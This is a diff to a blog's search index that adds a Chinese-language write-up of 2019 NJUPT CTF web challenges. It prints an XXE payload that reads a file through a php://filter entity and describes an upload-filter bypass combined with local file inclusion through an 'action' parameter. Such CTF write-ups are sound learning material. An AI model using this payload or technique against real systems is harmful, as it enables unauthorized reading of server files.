@@ -1,6 +1,36 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>2019NJUPT_CTF_WP</title>
+    <url>/2019/11/22/2019NJUPT-CTF-WP/</url>
+    <content><![CDATA[<h2 id="Fake-XML-cookbook"><a href="#Fake-XML-cookbook" class="headerlink" title="Fake XML cookbook"></a>Fake XML cookbook</h2><p>简单的XML</p><p><img src="/2019/11/22/2019NJUPT-CTF-WP/image-20191122221701015.png" alt="image-20191122221701015"></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=../../../flag" &gt;]&gt;</span>     </span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>1<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a>
+
+
+
+<h3 id="True-XML-cookbook"><a href="#True-XML-cookbook" class="headerlink" title="True XML cookbook"></a>True XML cookbook</h3><p>接着用上面的payload</p>
+<p><img src="/2019/11/22/2019NJUPT-CTF-WP/image-20191122222006279.png" alt="image-20191122222006279"></p>
+<p>正如提示所说，要利用xml做更多的事情</p>
+<h3 id="Upload-your-Shell"><a href="#Upload-your-Shell" class="headerlink" title="Upload your Shell"></a>Upload your Shell</h3><p>题目有一些过滤 后缀必须是图片的后缀</p>
+<p>文件中不能出现 <code>?&gt;</code></p>
+<p>上传后php代码成功就直接给flag的位置</p>
+<p><img src="/2019/11/22/2019NJUPT-CTF-WP/image-20191122225502634.png" alt="image-20191122225502634"></p>
+<p>想到页面中有个action参数</p>
+<p>把flag的位置给action得到flag</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://nctf2019.x1ct34m.com:60002/index.php?action=/var/www/html/upload-imgs/e8849c5939285e7053ba8d7af6cb1c25/Th1s_is_a_fl4g.jpg</span><br></pre></td></tr></table></figure>
+
+<p>4E 43 54 46</p>
+<p>78 67 84 70</p>
+<p>50 44 34 7E</p>
+<p>80 68 52 126</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>WP</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>2019红帽杯复现</title>
     <url>/2019/11/11/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[]]></content>
@@ -650,8 +680,8 @@
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>PHP</tag>
         <tag>WP</tag>
+        <tag>PHP</tag>
       </tags>
   </entry>
 </search>
